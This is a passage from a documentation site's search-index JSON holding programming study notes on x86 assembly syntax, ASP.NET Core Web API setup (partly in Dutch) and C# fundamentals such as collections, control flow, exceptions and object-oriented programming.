that does not need to be refreshed constantly.</li> </ul> <p>Caches: - Level-1 (L1): stored on the CPU - Level-2 (L2): stored outside and accessed by high-speed data bus</p>"},{"location":"Assembly/Architecture/x86_Architecture/#addresses","title":"Addresses","text":"<ul> <li>Absolute address: a direct reference of specific location.</li> <li>Segment address (or offset): starting address of a memory segment with the offset value.</li> </ul>"},{"location":"Assembly/Syntax/Character_Constants/","title":"Character constants","text":"<ul> <li>ASCII character = 1 byte</li> <li>enclosed in 'single' or \"double\" quotation marks</li> </ul>"},{"location":"Assembly/Syntax/Character_Constants/#example","title":"Example","text":"<p>'hello' or \"hello\" is 5 bytes.</p>"},{"location":"Assembly/Syntax/Declaring_Variables/","title":"Declaring variables","text":"<p>Declare variables in the .data section. The 'd' stands for defined / declared. So db is a defined or declared byte.</p> type size db 1 byte dw 2 bytes dd 4 bytes dq 8 bytes dt 10 bytes <p>We can also set aside uninitialized data, which is an empty section of memory that gets prepared for us to store data into.</p>"},{"location":"Assembly/Syntax/Identifiers/","title":"Identifiers | variable names","text":"<ul> <li>NOT case sensitive</li> <li>start with: A-Z / a-z / _ / @ / ? / $</li> <li>cannot start with a number</li> </ul>"},{"location":"Assembly/Syntax/Identifiers/#example","title":"Example","text":"<p>Var21, x20, _hello, ASPIRE, etc.</p>"},{"location":"Assembly/Syntax/Operator_Presedence/","title":"Operator presedence","text":"Operator Presedence level Description Example [ ] 1 Memory Access MOV EAX, [EBX] * 2 Scaling factor MOV EAX, [ECX*4] +,- 3 Address calcultation MOV EAX, [EBX + ECX]"},{"location":"Assembly/Syntax/Radix_Characters/","title":"Radix characters","text":"<p>[+ | -] digits [radix]</p> <pre><code>h - Hex\nd - Dec\nb - Bin\n</code></pre>"},{"location":"Assembly/Syntax/Radix_Characters/#example","title":"Example","text":"<p>30d, 6Ah, 42, 1101b</p>"},{"location":"Assembly/Syntax/Reserved_Words/","title":"Reserved words","text":"<p>Instruction mnemonics: <code>mov, cmp, jmp, add, sub, inc, dec, lea</code>, etc.</p>"},{"location":"Assembly/Syntax/Reserved_Words/#directives","title":"Directives","text":"<p>Tell MASM how to assemble the program .data, .code, etc</p>"},{"location":"Assembly/Syntax/Reserved_Words/#attributes","title":"Attributes","text":"<p>Words that provide size and usage information for variables and operands byte, word, doubleword, etc.</p>"},{"location":"Assembly/Syntax/Reserved_Words/#operators","title":"Operators","text":"<p>used in constant expressions such as +, MOD, etc...</p> <p></p>"},{"location":"CSharp/Frameworks/API/","title":"ASP.NET Core Web API overview","text":""},{"location":"CSharp/Frameworks/API/#theory","title":"Theory","text":"<p>ASP.NET Core MVC voorziet een framework voor het maken van API\u2019s met behulp van de MVC (Model View Controller) pattern. REST is een architecturale style maar geen standaard. Deze gaat bepalen hoe een goed gestructureerde API er moet uit zien. Constraints: - Uniform Interface - Client-server - Statelessness - Layered system - Cacheable - Code on demand</p> <p>Score your API based on the maturity: - Richardson Maturity Model</p> <p>Outer-facing contract: - URI - Hierarchical data - Filter, sorting, oredering - RPC-style calls</p> <p></p> <p>Basis CRUD operaties en hun HTTP / Web equivalent: - <code>Create</code> == <code>Post</code> - <code>Read</code> == <code>Get</code> - <code>Update</code> == <code>Put</code> - <code>Delete</code> == <code>Delete</code></p> <p>Meer HTTP operaties: - <code>PATCH</code>: Update gedeeltelijk een bestaande bron op basis van de verstrekte gegevens. Het wordt gebruikt wanneer je slechts een deel van de bron wilt bijwerken.</p> <ul> <li> <p><code>HEAD</code>: Vergelijkbaar met GET, maar het retourneert alleen de headerinformatie, niet de feitelijke gegevens.</p> </li> <li> <p><code>OPTIONS</code>: Geeft informatie over de communicatieopties voor de doelbron.</p> </li> <li> <p><code>TRACE</code>: Echos terug de ontvangen verzoekinformatie, zodat een client kan zien wat (indien iets) aan de andere kant van de server is aangekomen.</p> </li> <li> <p><code>CONNECT</code>: Reserveren van de netwerkverbinding voor het gebruik van een duplex tunnel, meestal gebruikt met HTTPS.</p> </li> </ul> Status codes Description Level 100 Informative codes Level 200 Success codes 200 ok 201 created 204 no content (for delete method) Level 300 Redirection codes (not really used in API) Level 400 User-error codes 400 bad request 401 unauthorized 403 authorized but no rights 404 data not found 405 method not allowed 406 not acceptable / wrong format 409 conflict / concurrency 415 unsupported media type 415 unprocessable entity / validation error Level 500 Insernal server error codes <p>Wanneer we vandaag spreken over API\u2019s, dan spreken in \u00e9\u00e9n adem over Json, maar Json is geen onderdeel van REST. Het is wel het meest gebruikte formaat voor een response, maar het kan evengoed XML zijn.</p> <p>anneer we gaan bepalen welk type response we terug krijgen of geven, dan spreken we over content negotiation.</p>"},{"location":"CSharp/Frameworks/API/#practice","title":"Practice","text":"<ol> <li>Create MVC architecture project in VS</li> <li>ASP.NET Core Web Application API</li> <li>Project name ends with .API and solution name doesn't because of n amount of projects in solution</li> <li>Remove default stuff like weather forecast controller</li> <li>Change the projects debug profile to console app<ol> <li>Disable launch browser</li> <li>Use some default app url like localhost:51044</li> </ol> </li> <li>Create data store</li> <li>NuGet Add<ol> <li>EFCore</li> <li>EFCore.SqlServer</li> <li>EFCore.Tools</li> </ol> </li> <li>Create models / entities</li> <li>DBContext</li> <li>Create EF CRUD service interface &amp; repository</li> <li>Startup -&gt; Configure services</li> <li>Add-Migration InitialMigration</li> <li> <p>application.json logging</p> <pre><code>```json\n{\n    \"Logging\":{\n        \"Console\":{\n            \"LogLevel\":{\n            \"Microsoft.Hosting.Lifetime\": \"Trace\"\n            }\n        }\n    },\n    \"AllowedHosts\": \"*\"\n}\n```\n</code></pre> <ol> <li>Create our controller</li> <li>IActionResult methods</li> <li>Add routing attributes</li> <li>Configure endpoint routing in Startup.cs Configure()</li> <li>Test requests in postman, status codes and all..</li> <li>Return the correct status codes methods from the MVC controller classes and handle bad requests</li> <li>ConfigureServices in the startup.cs again to accept more than just JSON</li> <li>Returning custom objects using Models / Data Transfer Objects</li> <li>Change the controller return types from IActionResult to something like <code>ActionResult&lt;IEnumerable&lt;AuthorDto&gt;&gt;</code>, (remember DTO = Data Transfer Object)</li> <li>Instead of the manual object mapping that we did in step 3 we can use NuGet <code>AutoMapper.Extensions.Microsoft.DependencyInjection</code></li> <li>Create a objectProfile class that inherits from profile</li> <li>Now, create a mapping, the finished class looks like this:</li> </ol> <p><pre><code>namespace CourseLibrary.API.Profiles\n{\n   public class AuthorsProfile : Profile\n   {\n      public AuthorsProfile()\n      {\n            CreateMap&lt;Entities.Author, Models.AuthorDto&gt;()\n               .ForMember(\n                  dest =&gt; dest.Name,\n                  opt =&gt; opt.MapFrom(src =&gt; $\"{src.FirstName} {src.LastName}\"))\n               .ForMember(\n                  dest =&gt; dest.Age,\n                  opt =&gt; opt.MapFrom(src =&gt; src.DateOfBirth.GetCurrentAge()));\n      }\n   }\n}\n</code></pre> 5. Error handling:    1. When you expect a validation fault, DON'T use exception handling. It costs quite come resources, the API user might loop this and crash the API...    2. Also, Internal Server Errors give away the entire stacktrace which is a security concern and the API user can't use it anyways cause it's on our server, so:   1. Project properties -&gt; Debug tab -&gt; <code>ASPNETCORE_ENVIRONMENT:Development</code>, change this to <code>ASPNETCORE_ENVIRONMENT:Production</code>.   2. Navigate to <code>Startup.cs.Configure()</code> and add:</p> <p><pre><code>app.UseExceptionHandler(appBuilder =&gt;\n{\n   appBuilder.Run(async context =&gt;\n   {\n      context.Response.StatusCode = 500;\n      await context.Response.WriteAsync(\"Een onverwachte fout heeft zich voorgedaan. Probeer het later opnieuw.\");\n   });\n});\n</code></pre> 6. Filtering and searching, usually used when you know what items are inside of a collection</p> </li> </ol>"},{"location":"CSharp/Level1/Basics/","title":"Basics","text":""},{"location":"CSharp/Level1/Basics/#entry-point","title":"Entry point","text":"<p>C#'s Entry point, like other languages is the <code>Main</code> function. It's the function that gets ran first whenever we start the program. For now there's no need to worry about <code>static</code>, <code>void</code> or <code>string[]</code>, it's unimportant.</p> <p>Take a look at the picture below, this is what a typical C# program looks like at first:</p> <p></p>"},{"location":"CSharp/Level1/Basics/#data-types","title":"Data types","text":"<p>Variables are a container for us to store a value that belongs to a <code>data type</code>. There's two different types of value types: <code>value</code> and <code>reference</code>.</p> <p>If you want to know more: - Value types store the actual value <code>directly</code>. - Reference types store a <code>reference</code> (memory address) that points to the value.</p> <p>We can use built-in types that are defined by the language or build these data types ourselves. Sone of these types like the user-defined reference types will seem complicated at first, know that they're unimportant for now.</p>"},{"location":"CSharp/Level1/Basics/#value-types","title":"Value types","text":"<p>Predefined:</p> Real-word type According C# keyword Example Whole numbers <code>int</code> <code>-5</code> or <code>5</code> Floating point numbers <code>float</code> or <code>double</code> <code>-5.5</code> or <code>5.5</code> Letters <code>char</code> <code>'A'</code> or <code>'z'</code> Validity <code>bool</code> <code>true</code> or <code>false</code> <p>User-Defined:</p> Real-word type According C# keyword Example A lightweight type for grouping others. <code>struct</code> <code>struct Point { public int X, Y; }</code> A set of names constant values. <code>enum</code> <code>enum Days { Monday, Tuesday }</code>"},{"location":"CSharp/Level1/Basics/#reference-types","title":"Reference types","text":"<p>Predefined:</p> Real-word type According C# keyword Example Sentences (collection of letters) <code>string</code> <code>\"Hello World!\"</code> A 'thing', any thing. <code>object</code> <code>\"Hello World!\"</code> or <code>5.5</code> <p>User-Defined:</p> Real-word type According C# keyword Example A constructed object that can do things. <code>class</code> <code>class Dog{}</code> A contract / rules for objects on how to behave. <code>interface</code> <code>interface Dog{}</code> A reference to a function. <code>delegate</code> <code>public delegate int PerformCalculation(int x, int y);</code>"},{"location":"CSharp/Level1/Basics/#variables","title":"Variables","text":"<p>Wokring with variables throughout our program we will often change their values. However, we also somewhat keep track of their state.</p> <p>A variable can be <code>declared</code> without a initial value: <code>int a;</code></p> <p>Note that some types will get defaulted to a initial value like 0.</p> <p>A variable can be <code>assigned</code> a value: <code>a = 5;</code></p> <p>A variable can be <code>initialized</code> (declared with a value): <code>int a = 5;</code></p>"},{"location":"CSharp/Level1/Basics/#operators","title":"Operators","text":"<p>We can perform some calculations or variables or literal values using operators.</p> <p>There's a bunch of types of operators. Usually when thinking of operators we think of <code>Arithmetic</code> operators like <code>plus</code>.</p> <p>For example: <code>int a = 5 + 5;</code> or <code>int b = a + 5;</code> or <code>int c = a + b;</code></p>"},{"location":"CSharp/Level1/Basics/#arithmetic","title":"Arithmetic","text":"Name Operator Addition <code>+</code> Subtraction <code>-</code> Multiplication <code>*</code> Division <code>/</code> Modulus <code>%</code> Increment <code>++</code> Decrement <code>--</code>"},{"location":"CSharp/Level1/Basics/#assignment","title":"Assignment","text":"Name Operator Assignment <code>=</code> Addition assignment <code>+=</code> Subtraction assignment <code>-=</code> Multiplication assignment <code>*=</code> Division assignment <code>/=</code> Modulus assignment <code>%=</code>"},{"location":"CSharp/Level1/Basics/#comparison","title":"Comparison","text":"Name Operator Equal to <code>==</code> Not equal to <code>!=</code> Greater than <code>&gt;</code> Less than <code>&lt;</code> Greater than or equal to <code>&gt;=</code> Less than or equal to <code>&lt;=</code>"},{"location":"CSharp/Level1/Basics/#logical","title":"Logical","text":"Name Operator Logical AND <code>&amp;&amp;</code> Logical OR <code>\\|\\|</code> Logical NOT <code>!</code>"},{"location":"CSharp/Level1/Collections/","title":"Data collections","text":"<p>In C#, data collections are used to store and manage <code>multiple values in a single structure</code>. Each type of collection serves a unique purpose, depending on how you want to manage, access,  and modify the data.</p>"},{"location":"CSharp/Level1/Collections/#summary","title":"Summary","text":"Collection Description When to Use <code>Array</code> Fixed-size, indexed collection When the size is known and unchanging <code>List</code> Dynamic-sized, indexed collection When the size may change dynamically <code>Dictionary</code> Key-value pairs, fast lookup When you need fast access to values by unique keys <code>Enum</code> Named constants When you have a set of related constant values <code>Queue</code> FIFO (First In First Out) When you need a queue-like structure <code>Stack</code> LIFO (Last In First Out) When you need a stack-like structure <code>HashSet</code> Unordered, unique elements When duplicates should be avoided <code>SortedList</code> Key-value pairs, sorted by key When you need a sorted key-value collection"},{"location":"CSharp/Level1/Collections/#arrays","title":"Arrays","text":"<p>An array is a fixed-size collection that holds elements of the same type.</p> <p>Characteristics: - Fixed size \u2013 once defined, the size cannot change. - Indexed \u2013 elements are accessed using an index (0-based). - Homogeneous \u2013 all elements must be of the same type.</p> <pre><code>int[] numbers = new int[3]; // Creates an array of 3 integers\nnumbers[0] = 1;\nnumbers[1] = 2;\nnumbers[2] = 3;\n\nConsole.WriteLine(numbers[0]); // Output: 1\n</code></pre>"},{"location":"CSharp/Level1/Collections/#enums","title":"Enums","text":"<p>An enum (short for enumeration) is a special \"class\" that represents a set of named constants.</p> <p>Characteristics: - Named values \u2013 enums allow you to represent a set of related constants with meaningful names. - Underlying type \u2013 by default, the underlying type is int, but you can specify a different base type. - Readable code \u2013 makes code more readable and maintainable by replacing magic numbers with names.</p> <pre><code>enum Days { Sunday, Monday, Tuesday, Wednesday, Thursday, Friday, Saturday }\n\nDays today = Days.Monday;  \nConsole.WriteLine(today); // Output: Monday\n\nint dayNumber = (int)Days.Wednesday;  \nConsole.WriteLine(dayNumber); // Output: 3\n</code></pre>"},{"location":"CSharp/Level1/Collections/#lists","title":"Lists","text":"<p>A list is a dynamic collection that can grow or shrink in size. It is part of the <code>System.Collections.Generic</code> namespace.</p> <p>Characteristics: - Flexible size \u2013 the list can change size as needed. - Indexed \u2013 elements are accessed using an index (0-based). - Homogeneous \u2013 all elements must be of the same type. - Better performance than arrays when dealing with resizing.</p> <pre><code>List&lt;int&gt; numbers = new List&lt;int&gt;();  \nnumbers.Add(1);  \nnumbers.Add(2);  \nnumbers.Add(3);  \n\nConsole.WriteLine(numbers[0]); // Output: 1\nnumbers.Remove(2); // Removes 2 from the list\n</code></pre>"},{"location":"CSharp/Level1/Collections/#dictionaries-dicts","title":"Dictionaries (Dicts)","text":"<p>A dictionary is a collection of key-value pairs, where each key is unique. It is part of the <code>System.Collections.Generic</code> namespace.</p> <p>Characteristics: - Key-value pairs \u2013 each element is a pair of a key and its associated value. - Fast lookups \u2013 keys are hashed for quick access. - No fixed size \u2013 similar to lists, dictionaries can grow or shrink.</p> <pre><code>Dictionary&lt;string, int&gt; phoneBook = new Dictionary&lt;string, int&gt;();  \nphoneBook.Add(\"Alice\", 123456789);\nphoneBook.Add(\"Bob\", 987654321);  \n\nConsole.WriteLine(phoneBook[\"Alice\"]); // Output: 123456789\n</code></pre>"},{"location":"CSharp/Level1/Collections/#queues","title":"Queues","text":"<p>A queue is a first-in, first-out (FIFO) collection. Elements are added at the end and removed from the front.</p> <p>Characteristics: - FIFO \u2013 the first element added is the first one to be removed. - Often used in scenarios like task scheduling or buffering.</p> <pre><code>Queue&lt;string&gt; queue = new Queue&lt;string&gt;();  \nqueue.Enqueue(\"Task 1\");  \nqueue.Enqueue(\"Task 2\");  \n\nConsole.WriteLine(queue.Dequeue()); // Output: Task 1\n</code></pre>"},{"location":"CSharp/Level1/Collections/#stacks","title":"Stacks","text":"<p>A stack is a last-in, first-out (LIFO) collection. Elements are added and removed from the top.</p> <p>Characteristics: - LIFO \u2013 the last element added is the first one to be removed. - Often used in scenarios like undo functionality or call stack tracking.</p> <pre><code>Stack&lt;string&gt; stack = new Stack&lt;string&gt;();  \nstack.Push(\"Task 1\");  \nstack.Push(\"Task 2\");\n\nConsole.WriteLine(stack.Pop()); // Output: Task 2\n</code></pre>"},{"location":"CSharp/Level1/Collections/#hashset","title":"HashSet","text":"<p>A HashSet is an unordered collection that only allows unique elements.</p> <p>Characteristics: - No duplicates \u2013 automatically removes duplicates when adding elements. - Unordered \u2013 elements are stored without any specific order.</p> <pre><code>HashSet&lt;int&gt; uniqueNumbers = new HashSet&lt;int&gt;();  \nuniqueNumbers.Add(1);  \nuniqueNumbers.Add(2);  \nuniqueNumbers.Add(2); // Duplicate, won't be added\n\nConsole.WriteLine(uniqueNumbers.Count); // Output: 2\n</code></pre>"},{"location":"CSharp/Level1/Collections/#sortedlist","title":"SortedList","text":"<p>A SortedList is a collection of key-value pairs that maintains the keys in sorted order.</p> <p>Characteristics: - Sorted by key \u2013 the keys are sorted in ascending order. - Uses a binary search for efficient lookup.</p> <pre><code>SortedList&lt;int, string&gt; sortedList = new SortedList&lt;int, string&gt;();  \nsortedList.Add(3, \"Three\");  \nsortedList.Add(1, \"One\");  \nsortedList.Add(2, \"Two\");\n\nConsole.WriteLine(sortedList[1]); // Output: One\n</code></pre>"},{"location":"CSharp/Level1/Control_Flow/","title":"Control flow","text":"<p>Simply said, control flow statements allow us to alter the execution of our programs based on certain conditions.</p>"},{"location":"CSharp/Level1/Control_Flow/#if-if-else-else-if-ternary-operator","title":"If, if-else, else-if &amp; ternary operator","text":"<p>Used to control the execution based on a singular or limited amount of conditions.</p> <p><pre><code>if (condition) \n{\n  // block of code to be executed if the condition is True\n}\n</code></pre> <pre><code>if (condition)\n{\n  // block of code to be executed if the condition is True\n} \nelse \n{\n  // block of code to be executed if the condition is False\n}\n</code></pre> <pre><code>if (condition)\n{\n  // block of code to be executed if condition1 is True\n} \nelse if (condition2) \n{\n  // block of code to be executed if the condition1 is false and condition2 is True\n} \nelse\n{\n  // block of code to be executed if the condition1 is false and condition2 is False\n}\n</code></pre></p> <pre><code>variable = (condition) ? expressionTrue :  expressionFalse;\n</code></pre>"},{"location":"CSharp/Level1/Control_Flow/#switch","title":"Switch","text":"<p>Used to control the execution based on multiple conditions. The expression gets evaluated once and then the code with the matching case gets executed.</p> <pre><code>switch(expression) \n{\n  case x:\n    // code block\n    break;\n  case y:\n    // code block\n    break;\n  default:\n    // code block\n    break;\n}\n</code></pre>"},{"location":"CSharp/Level1/Control_Flow/#while-do-while-loop","title":"While &amp; do-while loop","text":"<p>Used to keep execution certain statements while the condition evaluates to true. A common way to infinetly loop execution is to use <code>while (true)</code>.</p> <p>The do-while loop will execute atleast once, even if the condition is false.</p> <p><pre><code>while (condition) \n{\n  // code block to be executed\n}\n</code></pre> <pre><code>do \n{\n  // code block to be executed\n}\nwhile (condition);\n</code></pre></p>"},{"location":"CSharp/Level1/Control_Flow/#for-foreach-loop","title":"For &amp; foreach loop","text":"<p>Used when you know the specific amount of loops you would like to do.</p> <ul> <li><code>Statement 1</code>: is executed (one time) before the execution of the code block. Usually this is the initialization of some <code>indexer</code>.</li> <li><code>Statement 2</code>: defines the <code>condition</code> for executing the code block.</li> <li><code>Statement 3</code>: is <code>executed (every time) after</code> the code block has been executed.</li> </ul> <pre><code>for (statement 1; statement 2; statement 3) \n{\n  // code block to be executed\n}\n</code></pre> <p>Typically a for-loop looks like this: <pre><code>for (int i = 0; i &lt; 5; i++) \n{\n  Console.WriteLine(i);\n}\n</code></pre></p> <p>A foreach loop is typically used to go through a collection: <pre><code>foreach (type variableName in arrayName) \n{\n  // code block to be executed\n}\n</code></pre></p>"},{"location":"CSharp/Level1/Control_Flow/#break-continue","title":"Break &amp; continue","text":"<ul> <li><code>Break</code>: jumps out of a loop</li> <li><code>Continue</code>: skips one iteration and continues to the next iteration</li> </ul> <pre><code>while (i &lt; 10) \n{\n  if (i == 4) \n  {\n    i++;\n    continue;\n  }\n  Console.WriteLine(i);\n  i++;\n}\n</code></pre>"},{"location":"CSharp/Level1/Conversion_Parsing/","title":"Type conversion and parsing","text":"<p>Conversion is the process of going from one data type to another. This can be done in a couple of different ways: - <code>Casting</code>: convert compatible types (e.g., <code>int \u2192 double</code>). - <code>as</code> conversion: <code>safe type conversion</code> between compatible reference types or nullable value types. It <code>attempts to cast</code> an object to a specified type and returns <code>null if the conversion fails, instead of throwing an exception like a direct cast ((Type)obj)</code> would. - Conversion <code>methods</code>: hanging between more diverse types, including incompatible types (e.g., <code>string \u2192 int</code>). - <code>Parsing</code>: exclusively for converting strings into numeric types (<code>string \u2192 int, double, etc.</code>).</p>"},{"location":"CSharp/Level1/Conversion_Parsing/#casting-compatible-types","title":"Casting compatible types","text":"<ul> <li> <p>Implicitly casting (safe or automatic) by the programming language:</p> <pre><code>int num = 2147483647;\nlong bigNum = num;\n</code></pre> </li> <li> <p>Explicit (manual) casting by us:</p> <pre><code>double x = 1234.7;\na = (int)x;\n\n//Derivative\nGiraffe g = new Giraffe();\nAnimal a = g; // class Giragge : Animal &lt;- base\n</code></pre> </li> </ul>"},{"location":"CSharp/Level1/Conversion_Parsing/#as-conversion","title":"As conversion","text":"<pre><code>object obj = someValue;\nSomeType variable = obj as SomeType;\n\n\nobject obj = 123;  // Integer\nstring str = obj as string;\n\nif (str == null)\n{\n    Console.WriteLine(\"Casting failed!\"); // Output: Casting failed!\n}\n</code></pre>"},{"location":"CSharp/Level1/Conversion_Parsing/#conversion-methods","title":"Conversion methods","text":"<ul> <li>Handles <code>null</code> values gracefully (returns 0 instead of an exception).</li> <li>Works for different types, including bool, DateTime, etc.</li> <li>Use when converting between different types (e.g., string to int, double to bool).</li> </ul> <pre><code>string strNum = \"42\";\nint num = Convert.ToInt32(strNum); // Converts string to int\n</code></pre> Type conversion methods <code>ToBoolean</code> <code>ToByte</code> <code>ToChar</code> <code>ToDateTime</code> <code>ToDecimal</code> <code>ToDouble</code> <code>ToInt16</code> <code>ToInt32</code> <code>ToInt64</code> <code>ToSbyte</code> <code>ToSingle</code> <code>ToString</code> <code>ToType</code> <code>ToUInt16</code> <code>ToUInt32</code> <code>ToUInt64</code>"},{"location":"CSharp/Level1/Conversion_Parsing/#parsing-strings","title":"Parsing strings","text":"<p>Using <code>Parse()</code>: <pre><code>string strNum = \"42\";\nint num = int.Parse(strNum); // Returns an exception if the parse fails.\n</code></pre></p> <p>Using <code>TryParse()</code> is <code>safer</code> because it returns true if parsing succeeds, false otherwise. <pre><code>string strNum = \"42\";\nbool success = int.TryParse(strNum, out int num);\n</code></pre></p>"},{"location":"CSharp/Level1/Exceptions/","title":"Exception handling","text":"<p>Exception handling is a way to manage errors and prevent your program from crashing unexpectedly. Exceptions are events that disrupt the normal flow of execution, and C# offers ways to deal with them safely.</p>"},{"location":"CSharp/Level1/Exceptions/#what-is-an-exception","title":"What is an exception?","text":"<p>An exception is an error that occurs during the execution of a program. It usually indicates that something went wrong, like trying to divide by zero or accessing an element outside an array's bounds.</p>"},{"location":"CSharp/Level1/Exceptions/#types","title":"Types","text":"<p>All exceptions in C# are derived from the base class: <code>System.Exception</code>. There are many different types of exceptions that represent specific errors.</p> <p>Examples include: - <code>ArithmeticException</code>: Thrown when an arithmetic operation goes wrong, like dividing by zero. - <code>FileNotFoundException</code>: Thrown when a file is not found in the expected location. - <code>IndexOutOfRangeException</code>: Thrown when accessing an array element outside of its valid range. - <code>TimeoutException</code>: Thrown when a specific time limit is exceeded during an operation.</p>"},{"location":"CSharp/Level1/Exceptions/#throwing-exceptions","title":"Throwing exceptions","text":"<p>The <code>throw</code> statement is used together with a <code>System.Exception</code> derived class type.</p> <pre><code>if (age &lt; 18)\n  {\n    throw new ArithmeticException(\"Access denied - You must be at least 18 years old.\");\n  }\n</code></pre>"},{"location":"CSharp/Level1/Exceptions/#handling-exceptions","title":"Handling exceptions","text":"<p>While throwing exceptions is useful, handling them properly is crucial. You should <code>never let an exception crash your program unexpectedly</code> unless absolutely necessary. Always <code>catch</code> exceptions and take appropriate action, such as logging the error or showing a user-friendly message.</p> <p>Use <code>try-catch</code> to handle exceptions, the try-catch block, which attempts to execute code and catches any exceptions that occur.</p> <pre><code>try\n{\n    int number = int.Parse(\"NotANumber\"); // This will throw an exception\n}\ncatch (FormatException ex)\n{\n    Console.WriteLine(\"Error: \" + ex.Message);\n}\n</code></pre> <p>Sometimes, you need to clean up resources (like closing files or releasing memory) regardless of whether an exception was thrown or not. The <code>finally</code> block ensures that your code runs in both cases.</p> <pre><code>try\n{\n    Console.WriteLine(\"Opening file...\");\n    // Code that may throw an exception\n}\ncatch (Exception ex)\n{\n    Console.WriteLine(\"Error: \" + ex.Message);\n}\nfinally\n{\n    Console.WriteLine(\"Cleanup: Closing file...\");\n}\n</code></pre>"},{"location":"CSharp/Level1/Exceptions/#advanced-creating-user-defined-exceptions","title":"Advanced: Creating User-Defined Exceptions","text":"<ol> <li>Your class has to inherit from System.Exception</li> <li>Make sure the class is serializable, add the [Serializable] attribute</li> <li>Provide common exception constructors <pre><code>[Serializable] // Ensures that your custom exception can be serialized.\npublic class MyException : Exception\n{\n    // Default constructor\n    public MyException () {}\n\n    // Constructor with a message\n    public MyException (string message) \n        : base(message) {}\n\n    // Constructor with a message and inner exception\n    public MyException (string message, Exception innerException)\n        : base (message, innerException) {}    \n}\n</code></pre></li> </ol>"},{"location":"CSharp/Level1/Functions/","title":"Functions / Methods","text":"<p>A <code>function</code> is a block of code that will run whenever we call it, think of our <code>Main</code> function.</p> <p>Functions that are part of a class are called <code>methods</code>. In C#, every code file (<code>.cs</code>) must have its code inside a <code>class</code>. Because of this, every function in C# belongs to a class and is, therefore, a method.</p> <p>We usually use methods to make our code easier to read, organized, reusable, etc.</p>"},{"location":"CSharp/Level1/Functions/#working-with-methods","title":"Working with methods","text":"<p>Methods in C# have several components: - A return <code>type</code> \u2013 Specifies what type of value the method returns. - A name (<code>identifier</code>) \u2013 The method\u2019s unique name. - A list of <code>parameters</code> (optional) \u2013 Inputs that the caller can provide. - A visibility level (access modifier) \u2013 Defines where the method can be accessed (e.g., public, private). (Not important for now.)</p> <p><code>Void Methods</code>: Methods with a void return type do not return a value, they simply execute their code.</p> <pre><code>int Add(int a, int b) \n{\n    return a + b; // Returns the sum of a and b as an integer type\n}\n</code></pre> <pre><code>void PrintLine(string sentence) \n{\n    Console.WriteLine(sentence); // Prints the provided sentence to the console\n}\n</code></pre> <pre><code>void PrintLine() \n{\n    Console.WriteLine(\"I got passed 0 arguments.\"); // No parameters\n}\n</code></pre> <p><code>Calling</code> these functions would look something like this: <pre><code>// When we call functions we pass arguments for the asked parameters.\nint a = Add(5, 5);\nPrintLine(\"int a is equal to: \" + a);\nPrintLine();\n</code></pre></p>"},{"location":"CSharp/Level1/OOP/","title":"Object-Oriented Programming (OOP)","text":"<p>This is most likely the most confusing and important part of C#. To clear up any confusion about OOP, think of it like this:</p> <p>\"An object is an instance of a user-defined data type that also holds the procedures (methods) that perform on it's data.\"</p> <p>Before diving deeper into OOP, let's compare it to the opposite approach: <code>Procedural Programming</code>.</p> Procedural Programming Object-Oriented Programming Focuses on functions (procedures) that operate on data. Focuses on objects, which contain both data and behavior. Data is separate from logic. Data and logic are bundled together in objects. Example: C, older programming styles. Example: C#, Java, Python (OOP languages). Less structured for large projects. Easier to scale and maintain. <p>Example of procedural programming: <pre><code>string name = \"Alice\";\nvoid SayHello(string name)\n{\n    Console.WriteLine(\"Hello, \" + name);\n}\n\nSayHello(name); // Function call\n</code></pre></p> <p>Example of OOP: <pre><code>class Person\n{\n    public string Name;\n\n    public void SayHello()\n    {\n        Console.WriteLine(\"Hello, \" + Name);\n    }\n}\n\n// Creating an instance (object)\nPerson person = new Person(); // Creating the \nperson.Name = \"Alice\";\nperson.SayHello(); // Method call\n</code></pre></p>"},{"location":"CSharp/Level1/OOP/#why-oop","title":"Why OOP?","text":"<ul> <li>Faster and easier to execute</li> <li>Clear structure</li> <li>Prevents DRY \"Don't Repeat Yourself\"</li> <li>Easier to maintain, scale, modify and debug</li> <li>Provides modularity by making the code re-useable</li> </ul>"},{"location":"CSharp/Level1/OOP/#the-four-pillars-of-oop","title":"The four pillars of OOP","text":""},{"location":"CSharp/Level1/OOP/#1-encapsulation-keep-data-safe-inside-of-objects","title":"1. Encapsulation: keep data safe inside of objects.","text":"<p><code>Restricting direct access</code> to some of the object's data. This <code>prevents accidental modification</code> and <code>enforces controlled access</code>.</p> <pre><code>class Person\n{\n    private int age; // Private field, cannot be accessed directly\n\n    public int Age // Public property with validation\n    {\n        get { return age; }\n        set\n        {\n            if (value &gt;= 0)\n                age = value;\n            else\n                Console.WriteLine(\"Age cannot be negative!\");\n        }\n    }\n}\n</code></pre> <p>As you can see abstraction is mostly done by using <code>properties</code>: <pre><code>private string name; // field\n\n  public string Name   // property\n  {\n    get { return name; }   // get method\n    set { name = value; }  // set method\n  }\n</code></pre></p>"},{"location":"CSharp/Level1/OOP/#2-abstraction-hide-unnecessary-details","title":"2. Abstraction: hide unnecessary details","text":"<p>Hiding the unnecessary details from the user and <code>exposing only what's essential</code>.</p> <pre><code>class Car\n{\n    public void Start() // User doesn't worry about internal details\n    {\n        StartIgnition(); //hidden\n        InjectFuel(); //hidden\n        StartEngine(); //hidden\n\n        Console.WriteLine(\"Car started!\");\n    }\n\n    private void StartIgnition()\n    {\n        Debug.WriteLine(\"Ignition started...\");\n    }\n\n    private void InjectFuel()\n    {\n        Debug.WriteLine(\"Fuel injected...\");\n    }\n\n    private void StartEngine()\n    {\n        Debug.WriteLine(\"Engine started...\");\n    }\n}\n</code></pre> <p>As you can see abstraction is mostly done by using <code>access modifiers</code>:</p> Modifier Description <code>public</code> The code is accessible for all classes. <code>private</code> The code is only accessible within the same class. <code>protected</code> The code is accessible within the same class, or in a class that is inherited from that class. <code>internal</code> The code is only accessible within its own assembly, but not from another assembly. <p>There's also two combinations: <code>protected internal</code> and <code>private protected</code>.</p>"},{"location":"CSharp/Level1/OOP/#3-inheritance-reuse-and-extend-existing-code","title":"3. Inheritance: reuse and extend existing code","text":"<p>Allows a class (<code>child</code>) to <code>inherit attributes and behavior</code> from another class (<code>parent</code>), reducing code duplication.</p> <pre><code>class Vehicle // Base class\n{\n    public void Drive() { Console.WriteLine(\"Vehicle is driving.\"); }\n}\n\nclass Car : Vehicle { } // Inherits from Vehicle\nclass Truck : Vehicle { }\n\nCar myCar = new Car();\nTruck myTruck = new Truck();\nmyCar.Drive();   // Outputs: \"Vehicle is driving.\"\nmyTruck.Drive(); // Outputs: \"Vehicle is driving.\"\n</code></pre>"},{"location":"CSharp/Level1/OOP/#4-polymorphism-one-interface-many-implementations","title":"4. Polymorphism: one interface, many 